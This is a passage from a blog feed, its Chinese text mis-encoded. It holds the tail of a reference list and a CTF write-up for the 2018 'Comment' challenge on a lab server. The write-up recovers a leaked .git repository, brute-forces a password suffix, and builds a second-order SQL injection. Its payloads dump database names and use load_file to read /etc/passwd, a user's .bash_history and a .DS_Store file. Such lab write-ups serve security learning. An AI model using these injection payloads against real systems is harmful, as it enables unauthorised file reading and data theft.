class="hljs-number">2226</span>.<span class="hljs-number">3001</span>.<span class="hljs-number">4187</span><br><span class="hljs-attribute">https</span>://blog.csdn.net/qq_62414755/article/details/<span class="hljs-number">125886742</span>?ops_request_misc=%<span class="hljs-number">257</span>B%<span class="hljs-number">2522</span>request%<span class="hljs-number">255</span>Fid%<span class="hljs-number">2522</span>%<span class="hljs-number">253</span>A%<span class="hljs-number">2522170149059516800188587075</span>%<span class="hljs-number">2522</span>%<span class="hljs-number">252</span>C%<span class="hljs-number">2522</span>scm%<span class="hljs-number">2522</span>%<span class="hljs-number">253</span>A%<span class="hljs-number">252220140713</span>.<span class="hljs-number">130102334</span>..%<span class="hljs-number">2522</span>%<span class="hljs-number">257</span>D&amp;request_id=<span class="hljs-number">170149059516800188587075</span>&amp;biz_id=<span class="hljs-number">0</span>&amp;utm_medium=distribute.pc_search_result.none-task-blog-<span class="hljs-number">2</span>~<span class="hljs-literal">all</span>~top_click~default-<span class="hljs-number">2</span>-<span class="hljs-number">125886742</span>-null-null.<span class="hljs-number">142</span>^v96^pc_search_result_base9&amp;utm_term=java%E5%<span class="hljs-number">8</span>F%<span class="hljs-number">8</span>D%E5%BA%<span class="hljs-number">8</span>F%E5%<span class="hljs-number">88</span>%<span class="hljs-number">97</span>%E5%<span class="hljs-number">8</span>C%<span class="hljs-number">96</span>&amp;spm=<span class="hljs-number">1018</span>.<span class="hljs-number">2226</span>.<span class="hljs-number">3001</span>.<span class="hljs-number">4187</span><br><span class="hljs-attribute">https</span>://blog.csdn.net/mochu7777777/article/details/<span class="hljs-number">130221488</span>?ops_request_misc=%<span class="hljs-number">257</span>B%<span class="hljs-number">2522</span>request%<span class="hljs-number">255</span>Fid%<span class="hljs-number">2522</span>%<span class="hljs-number">253</span>A%<span class="hljs-number">2522170149059516800188587075</span>%<span class="hljs-number">2522</span>%<span class="hljs-number">252</span>C%<span class="hljs-number">2522</span>scm%<span class="hljs-number">2522</span>%<span class="hljs-number">253</span>A%<span class="hljs-number">252220140713</span>.<span class="hljs-number">130102334</span>..%<span class="hljs-number">2522</span>%<span class="hljs-number">257</span>D&amp;request_id=<span class="hljs-number">170149059516800188587075</span>&amp;biz_id=<span class="hljs-number">0</span>&amp;utm_medium=distribute.pc_search_result.none-task-blog-<span class="hljs-number">2</span>~<span class="hljs-literal">all</span>~top_positive~default-<span class="hljs-number">1</span>-<span class="hljs-number">130221488</span>-null-null.<span class="hljs-number">142</span>^v96^pc_search_result_base9&amp;utm_term=java%E5%<span class="hljs-number">8</span>F%<span class="hljs-number">8</span>D%E5%BA%<span class="hljs-number">8</span>F%E5%<span class="hljs-number">88</span>%<span class="hljs-number">97</span>%E5%<span class="hljs-number">8</span>C%<span class="hljs-number">96</span>&amp;spm=<span class="hljs-number">1018</span>.<span class="hljs-number">2226</span>.<span class="hljs-number">3001</span>.<span class="hljs-number">4187</span><br><span class="hljs-attribute">https</span>://dyfloveslife.github.io/<span class="hljs-number">2020</span>/<span class="hljs-number">03</span>/<span class="hljs-number">21</span>/Serialization-and-Deserialization-in-Java/<br><span class="hljs-attribute">https</span>://websec.readthedocs.io/zh/latest/language/java/unserialize.html<br><span class="hljs-attribute">https</span>://xilitter.github.io/<span class="hljs-number">2023</span>/<span class="hljs-number">02</span>/<span class="hljs-number">23</span>/java%E5%<span class="hljs-number">8</span>F%<span class="hljs-number">8</span>D%E5%BA%<span class="hljs-number">8</span>F%E5%<span class="hljs-number">88</span>%<span class="hljs-number">97</span>%E5%<span class="hljs-number">8</span>C%<span class="hljs-number">96</span>%E5%<span class="hljs-number">9</span>F%BA%E7%A1%<span class="hljs-number">80</span>/<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>è®°å½•ä¸€é“å¾ˆæœ‰æ„æ€çš„.gitæ³„éœ²é¢˜ç›®</title>
    <link href="/2023/12/29/%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93%E5%BE%88%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84.git%E6%B3%84%E9%9C%B2%E9%A2%98%E7%9B%AE/"/>
    <url>/2023/12/29/%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93%E5%BE%88%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84.git%E6%B3%84%E9%9C%B2%E9%A2%98%E7%9B%AE/</url>
    
    <content type="html"><![CDATA[<p>æ€è·¯å¾ˆæ–°å¥‡ï¼Œå•ç‹¬ä»åšé¢˜è®°å½•é‡Œæ‹¿å‡ºæ¥å†™ä¸€ä¸‹</p><span id="more"></span><hr><h2 id="ç½‘é¼æ¯-2018-Comment"><a href="#ç½‘é¼æ¯-2018-Comment" class="headerlink" title="[ç½‘é¼æ¯ 2018]Comment"></a>[ç½‘é¼æ¯ 2018]Comment</h2><p><img src="/img/wdb2018comment1.png" alt="wdb2018comment1"></p><p>æ²¡æ‰¾åˆ°å•¥æç¤ºï¼Œ<code>dirsearch</code>èƒ½æ‰«å‡º<code>.git</code>æ–‡ä»¶ï¼Œç›´æ¥è®¿é—®å‘ç°<code>Forbidden</code></p><p><code>dirsearch -u http://27a5f1ac-984c-46a1-9c73-0fc68067d28c.node4.buuoj.cn:81/ --delay 3 -t 30</code></p><p><img src="/img/wdb2018comment3.png" alt="wdb2018comment3"></p><p><code>Githack</code>å¼„å®ƒï¼š</p><p><code>python Githack.py -u http://dd49341c-8374-4a4a-91ac-b258826c8af5.node4.buuoj.cn:81/.git/</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//write_do.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mysql.php&quot;</span>;<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>] != <span class="hljs-string">&#x27;yes&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>]))&#123;<br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>])<br>&#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;write&#x27;</span>:<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;comment&#x27;</span>:<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>åˆ°è¿™é‡Œä¸ä¼šåšäº†ã€‚ã€‚æ„Ÿè§‰è¿™ä¸ªæ–‡ä»¶æ²¡æœ‰å•¥å¯ç”¨çš„ä¿¡æ¯ï¼Ÿ</p><p>æˆ‘ä¸€å¼€å§‹ä»¥ä¸º<code>$_SESSION[&#39;login&#39;]</code>è¿™é‡Œä¼šæœ‰åˆ©ç”¨ç‚¹ã€‚åé¢çœ‹äº†<code>wp</code>æ‰çŸ¥é“è¿™ä¸œè¥¿ä¸å…¨ã€‚ã€‚</p><p><code>Kali</code>ä¸‹ï¼š</p><p><code>python2 GitHack.py http://27a5f1ac-984c-46a1-9c73-0fc68067d28c.node4.buuoj.cn:81/.git</code></p><p>ç„¶åè¿›å¯¹åº”æ–‡ä»¶å¤¹çœ‹æ‰€æœ‰åˆ†æ”¯æäº¤å†å²ï¼š</p><p><img src="/img/wdb2018comment4.png" alt="wdb2018comment4"></p><p><code>git reset --hard  e5b2a2443c2b6d395d06960123142bc91123148c</code></p><p><img src="/img/wdb2018comment5.png" alt="wdb2018comment5"></p><p>å†çœ‹<code>write_do.php</code>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mysql.php&quot;</span>;<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>] != <span class="hljs-string">&#x27;yes&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>]))&#123;<br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>])<br>&#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;write&#x27;</span>:<br>    <span class="hljs-variable">$category</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;category&#x27;</span>]);<br>    <span class="hljs-variable">$title</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;title&#x27;</span>]);<br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into board</span><br><span class="hljs-string">            set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span><br><span class="hljs-string">                title = &#x27;<span class="hljs-subst">$title</span>&#x27;,</span><br><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;comment&#x27;</span>:<br>    <span class="hljs-variable">$bo_id</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;bo_id&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select category from board where id=&#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-variable">$num</span> = <span class="hljs-title function_ invoke__">mysql_num_rows</span>(<span class="hljs-variable">$result</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>&gt;<span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-variable">$category</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>)[<span class="hljs-string">&#x27;category&#x27;</span>];<br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into comment</span><br><span class="hljs-string">            set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span><br><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;,</span><br><span class="hljs-string">                bo_id = &#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>    &#125;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./comment.php?id=<span class="hljs-subst">$bo_id</span>&quot;</span>);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>] != <span class="hljs-string">&#x27;yes&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªåœ°æ–¹å¥½åƒæ²¡å•¥å¯ä»¥åˆ©ç”¨çš„åœ°æ–¹ã€‚ã€‚</p><p>æ²¡ç»™<code>register</code>ç•Œé¢ï¼Œä¸è¿‡ä»–æç¤ºäº†ç”¨æˆ·åå’Œå¯†ç çš„ä¸€éƒ¨åˆ†ï¼Œ<code>zhangwei``zhangwei***</code>ï¼Œåé¢ä¸‰ä½æŠ“åŒ…çˆ†ç ´å°±è¡Œï¼š<code>zhangwei666</code></p><p>æ³¨æ„è¿™é‡Œï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$category</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;category&#x27;</span>]);<br>   <span class="hljs-variable">$title</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;title&#x27;</span>]);<br>   <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>   <span class="hljs-variable">$bo_id</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;bo_id&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>åªåšäº†å•çº¯çš„è½¬ä¹‰å¤„ç†ï¼Œå¾ˆå®¹æ˜“çŸ¥é“è¿™é‡Œå¯èƒ½å­˜åœ¨äºŒæ¬¡æ³¨å…¥ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//write</span><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into board</span><br><span class="hljs-string">            set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span><br><span class="hljs-string">                title = &#x27;<span class="hljs-subst">$title</span>&#x27;,</span><br><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;&quot;</span>;<br><span class="hljs-comment">//comment</span><br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>   <span class="hljs-variable">$category</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>)[<span class="hljs-string">&#x27;category&#x27;</span>];<br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into comment</span><br><span class="hljs-string">            set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span><br><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;,</span><br><span class="hljs-string">                bo_id = &#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br></code></pre></td></tr></table></figure><p><code>$category</code>å¯ä»¥å½“æ³¨å…¥ç‚¹ï¼ŒæŠ“åŒ…çœ‹ä¸‹æ•°æ®æ€ä¹ˆä¼ è¿‡å»çš„ï¼š</p><p><img src="/img/wdb2018comment6.png" alt="wdb2018comment6"></p><p>CATEGORYå­—æ®µï¼š<code>test&#39;,content=database()#</code></p><p>è¿™ä¸œè¥¿æ”¾è¿›å»å°±ç›¸å½“äºï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//write</span><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into board</span><br><span class="hljs-string">            set category = &#x27;test\&#x27;,content=database()#&#x27;,</span><br><span class="hljs-string">                title = &#x27;2&#x27;,</span><br><span class="hljs-string">                content = &#x27;222&#x27;&quot;</span>;<br><span class="hljs-comment">//comment</span><br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>   <span class="hljs-variable">$category</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>)[<span class="hljs-string">&#x27;category&#x27;</span>];<br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into comment</span><br><span class="hljs-string">            set category = &#x27;test&#x27;,content=database()#&#x27;,</span><br><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;,</span><br><span class="hljs-string">                bo_id = &#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br><br><br></code></pre></td></tr></table></figure><p>ç„¶ååœ¨<code>comment</code>ä¸‹è§¦å‘å°±è¡Œã€‚</p><p>ä½†å¥‡æ€ªçš„æ˜¯æˆ‘çš„<code>payload</code>å¹¶æ²¡æœ‰è§¦å‘ï¼Œ<code>comment</code>æäº¤ååŠ è½½ä¸å‡ºæ¥ã€‚ã€‚</p><p>åé¢æ‰çŸ¥é“å¯¹äºè¿™ç§å¤šè¡Œçš„<code>sql</code>è¯­å¥è¦ç”¨å¤šè¡Œæ³¨é‡Š<code>(\**\)</code>ã€‚ã€‚</p><p>æˆ‘å½“æ—¶ç†è§£çš„æ˜¯:</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">$sql = &quot;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> comment<br>            <span class="hljs-keyword">set</span> category = <span class="hljs-string">&#x27;&#x27;</span>,content=<span class="hljs-keyword">database</span>()#<span class="hljs-string">&#x27;,</span><br><span class="hljs-string">                content = &#x27;</span>$content<span class="hljs-string">&#x27;,</span><br><span class="hljs-string">                bo_id = &#x27;</span>$bo_id<span class="hljs-string">&#x27;&quot;;</span><br></code></pre></td></tr></table></figure><p><code>database()#</code>é‡Œçš„è¿™ä¸ª<code>#</code>æŠŠåé¢æ‰€æœ‰å†…å®¹å…¨æ³¨é‡Šæ‰äº†ï¼Œæ‰€ä»¥éšä¾¿å“ªä¸ª<code>bo_id</code>ä¸­å¯¹åº”çš„å†…å®¹éƒ½å›æ˜¾åº“åã€‚</p><p>å¯¹äºå¤šè¡Œ<code>sql</code>ï¼Œä¸¾ä¸ªæ —å­ï¼š</p><p><img src="/img/wdb2018comment7.png" alt="wdb2018comment7"></p><p>CATEGORYå­—æ®µï¼š<code>1&#39;,content=database(),/*</code></p><p>ç„¶åå†<code>comment</code>æ—¶<code>content</code>å­—æ®µæ”¹æˆï¼š<code>*/#</code>ï¼Œè¿™æ ·ç»„åˆç›¸å½“äºï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into comment</span><br><span class="hljs-string">        set category = &#x27;1&#x27;,content=database(),/*&#x27;,</span><br><span class="hljs-string">            content = &#x27;*/#&#x27;,</span><br><span class="hljs-string">            bo_id = &#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br></code></pre></td></tr></table></figure><p>ç¬¬äºŒè¡Œçš„<code>/*</code>ä¸ç¬¬ä¸‰è¡Œçš„<code>*/</code>å°†ä¸­é—´æ³¨é‡Šï¼Œè€Œç¬¬ä¸‰è¡Œçš„<code>#</code>ï¼Œå°†åé¢çš„<code>å•å¼•å·</code>å’Œ<code>é€—å·</code>ç»™æ³¨é‡Šäº†ã€‚</p><p><img src="/img/wdb2018comment9.png" alt="wdb2018comment9"></p><p>çˆ†åº“ï¼š<code>test&#39;,content=(select(group_concat(schema_name))from(information_schema.schemata)),/*</code></p><p>çˆ†è¡¨ï¼š<code>test&#39;,content=(select(group_concat(table_name))from(information_schema.tables)where((table_schema)=(database()))),/*</code></p><p><img src="/img/wdb2018comment16.png" alt="wdb2018comment16"></p><p>çˆ†å­—æ®µçš„æ—¶å€™ä¼šå‘ç°æ²¡æœ‰å’Œ<code>flag</code>æœ‰å…³çš„å­—æ®µï¼Œçœ‹äº†<code>wp</code>å‘ç°è¿™é‡Œè¦å»çœ‹<code>user</code>è¿™ä¸ªä¸œè¥¿ï¼š</p><figure class="highlight fix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fix"><span class="hljs-attr">1&#x27;,content</span>=<span class="hljs-string">user(),/*   //è¿”å›å½“å‰æ•°æ®åº“è¿æ¥çš„ç”¨æˆ·å</span><br></code></pre></td></tr></table></figure><p><img src="/img/wdb2018comment10.png" alt="wdb2018comment10"></p><blockquote><p> è¯´æ˜flagä¸åœ¨æ•°æ®åº“è€Œåœ¨æœ¬åœ°æ–‡ä»¶é‡Œï¼Œéœ€è¦è¯»å–ã€‚åœ¨æ•°æ®åº“ä¸­æ— éœ€rootæƒé™ã€‚</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;,content=(select load_file(&#x27;</span><span class="hljs-operator">/</span>etc<span class="hljs-operator">/</span>passwd<span class="hljs-string">&#x27;)),/*</span><br></code></pre></td></tr></table></figure><p><img src="/img/wdb2018comment11.png" alt="wdb2018comment11"></p><p>æ³¨æ„æœ€åä¸€è¡Œï¼Œ<code>www</code> ç”¨æˆ·çš„ <code>home</code> ç›®å½•(ç¬¬äº”ä¸ªå†’å·å)ä¸€èˆ¬éƒ½æ˜¯<code> /var/www</code>, è€Œè¿™é‡Œæ˜¯<code> /home/www</code></p><p>æˆ‘ä»¬å¯ä»¥æƒ³åŠæ³•è¯»å–<code>www</code>ç”¨æˆ·çš„æ“ä½œè®°å½•ï¼š</p><blockquote><p> .bash_historyä¿å­˜äº†å½“å‰ç”¨æˆ·ä½¿ç”¨è¿‡çš„å†å²å‘½ä»¤</p></blockquote><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">&#x27;,content=((<span class="hljs-keyword">select</span>(load_file(<span class="hljs-string">&quot;/home/www/.bash_history&quot;</span>)))),/*<br></code></pre></td></tr></table></figure><p><img src="/img/wdb2018comment13.png" alt="wdb2018comment13"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">cd <span class="hljs-regexp">/tmp/</span>ï¼šåˆ‡æ¢å½“å‰å·¥ä½œç›®å½•åˆ°<span class="hljs-regexp">/tmp/</span>ç›®å½•<br>unzip html.zipï¼šè§£å‹ç¼©åä¸ºhtml.zipçš„æ–‡ä»¶<br>rm -f html.zipï¼šå¼ºåˆ¶åˆ é™¤åä¸ºhtml.zipçš„æ–‡ä»¶<br>cp -r html <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/ï¼šå°†åä¸ºhtmlçš„ç›®å½•é€’å½’åœ°å¤åˆ¶åˆ°/</span>var<span class="hljs-regexp">/www/</span>ç›®å½•ä¸‹<br>cd <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>ï¼šåˆ‡æ¢å½“å‰å·¥ä½œç›®å½•åˆ°<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>ç›®å½•<br>rm -f .DS_Storeï¼šåˆ é™¤åä¸º.DS_Storeçš„æ–‡ä»¶<br>service apache2 startï¼šå¯åŠ¨Apache2æœåŠ¡<br></code></pre></td></tr></table></figure><p>åˆ é™¤äº†<code>/var/www/html/.DS_Store</code>ï¼Œä½†æ²¡åˆ <code>/tmp/html/.DS_Store</code>ã€‚</p><blockquote><p>.DS_Storeæ˜¯Mac OSä¿å­˜æ–‡ä»¶å¤¹çš„è‡ªå®šä¹‰å±æ€§çš„éšè—æ–‡ä»¶ï¼Œå¦‚æ–‡ä»¶çš„å›¾æ ‡ä½ç½®æˆ–èƒŒæ™¯è‰²ï¼Œç›¸å½“äºWindowsçš„desktop.iniã€‚ç»å¸¸ä¼šæœ‰ä¸€äº›ä¸å¯è§çš„å­—ç¬¦</p></blockquote><p>å°è¯•è¯»å–ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;,content=(select load_file(&#x27;</span><span class="hljs-operator">/</span>tmp<span class="hljs-operator">/</span>html<span class="hljs-operator">/</span>.DS_Store<span class="hljs-string">&#x27;)),/*</span><br></code></pre></td></tr></table></figure><p><img src="/img/wdb2018comment14.png" alt="wdb2018comment14"></p><p>ï¼Ÿï¼Ÿï¼Ÿçœ‹ä¸‹æºç ï¼š</p><p><img src="/img/wdb2018comment15.png" alt="wdb2018comment15"></p><p>ä¸€å¤§å †ä¹±ç ï¼Œå¯ä»¥å°è¯•è½¬æ¢æˆåå…­è¿›åˆ¶è¯»å–ï¼Œä¸ºå•¥ä¹ˆè¿™ä¹ˆè½¬åœ¨ç½‘ä¸ŠæŸ¥äº†ä¸€ä¸‹ï¼š</p><p><img src="/img/wdb2018comment17.png" alt="wdb2018comment17"></p><p><code>1&#39;,content=(select hex(load_file(&#39;/tmp/html/.DS_Store&#39;))),/*</code></p><p><img src="/img/wdb2018comment18.png" 